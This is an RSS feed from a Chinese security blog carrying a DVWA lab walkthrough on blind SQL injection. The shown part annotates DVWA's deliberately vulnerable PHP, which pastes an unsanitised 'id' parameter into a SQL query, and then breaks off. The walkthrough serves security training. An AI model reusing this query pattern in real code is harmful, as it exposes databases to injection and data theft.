@@ -1,0 +1,2252 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Sql on 知识带给我们自由</title>
+    <link>https://yuexuan521.github.io/zh/tags/sql/</link>
+    <description>Recent content in Sql on 知识带给我们自由</description>
+    <image>
+      <title>知识带给我们自由</title>
+      <url>https://yuexuan521.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://yuexuan521.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- 0.154.5</generator>
+    <language>zh</language>
+    <copyright>See this site&amp;rsquo;s source code here, licensed under GPLv3 ·</copyright>
+    <lastBuildDate>Mon, 23 Sep 2024 12:22:12 +0000</lastBuildDate>
+    <atom:link href="https://yuexuan521.github.io/zh/tags/sql/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>网络安全 DVWA通关指南 DVWA SQL Injection (Blind SQL盲注)</title>
+      <link>https://yuexuan521.github.io/zh/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-dvwa-sql-injection-blind-sql%E7%9B%B2%E6%B3%A8/</link>
+      <pubDate>Mon, 23 Sep 2024 12:22:12 +0000</pubDate>
+      <guid>https://yuexuan521.github.io/zh/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-dvwa-sql-injection-blind-sql%E7%9B%B2%E6%B3%A8/</guid>
+      <description>&lt;h2 id=&#34;dvwasqlinjection-blind&#34;&gt;DVWASQLInjection (Blind)&lt;/h2&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+    &lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg&#34;&gt;
+        &lt;img src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg&#34; 
+             alt=&#34;在这里插入图片描述&#34; 
+              
+             loading=&#34;lazy&#34;
+        /&gt;
+    &lt;/a&gt;
+&lt;/div&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;参考文献&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;WEB 安全靶场通关指南&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;low&#34;&gt;Low&lt;/h2&gt;
+&lt;p&gt;0、分析网页源代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;// Get input
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;// Check database
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;  &lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Removed &amp;#39;or die&amp;#39; to suppress mysql errors
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;c1&#34;&gt;// Get results
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// The &amp;#39;@&amp;#39; character suppresses errors
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;c1&#34;&gt;// Feedback for end user
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nv&#34;&gt;$html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;c1&#34;&gt;// User wasn&amp;#39;t found, so the page wasn&amp;#39;t!
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39; 404 Not Found&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;c1&#34;&gt;// Feedback for end user
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nv&#34;&gt;$html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$___mysqli_res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$___mysqli_res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;// 检查是否点击了提交按钮（例如，表单提交）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;if( isset( $_GET[ &amp;#39;Submit&amp;#39; ] ) ) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 获取用户通过GET方式传递的ID值
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    $id = $_GET[ &amp;#39;id&amp;#39; ];
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 创建SQL查询语句：根据$user_id查询users表中的first_name和last_name字段
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    $getid  = &amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;$id&amp;#39;;&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 执行SQL查询（假设$___mysqli_ston是全局的数据库连接对象）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 使用@字符抑制可能出现的MySQL错误信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    $result = mysqli_query($GLOBALS[&amp;#34;___mysqli_ston&amp;#34;],  $getid );
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 获取查询结果中记录的数量
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    $num = @mysqli_num_rows( $result );
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 判断查询结果中是否存在记录
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    if( $num &amp;gt; 0 ) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        // 如果查询到至少一条记录，则输出反馈信息表示用户ID存在于数据库中
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        $html .= &amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    else {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        // 若未查询到任何记录，则发送HTTP 404状态码（页面未找到）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        header( $_SERVER[ &amp;#39;SERVER_PROTOCOL&amp;#39; ] . &amp;#39; 404 Not Found&amp;#39; );
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        // 同时输出反馈信息表示用户ID在数据库中不存在
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;        $html .= &amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    // 关闭数据库连接
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&amp;#34;___mysqli_ston&amp;#34;]))) ? false : $___mysqli_res);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;// 从URL参数中获取一个id，然后查询数据库中是否存在对应这个id的用户。如果存在，它会在页面上显示&amp;#34;User ID exists in the database.&amp;#34;；如果不存在，则发送HTTP 404状态码并显示&amp;#34;User ID is MISSING from the database.&amp;#34;。
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="dvwasqlinjection-blind">DVWASQLInjection (Blind)</h2>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg" 
+             alt="在这里插入图片描述" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<hr>
+<p>参考文献</p>
+<ul>
+<li><a href="https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA"target="_blank" rel="noopener noreferrer">WEB 安全靶场通关指南</a></li>
+</ul>
+<hr>
+<h2 id="low">Low</h2>
+<p>0、分析网页源代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
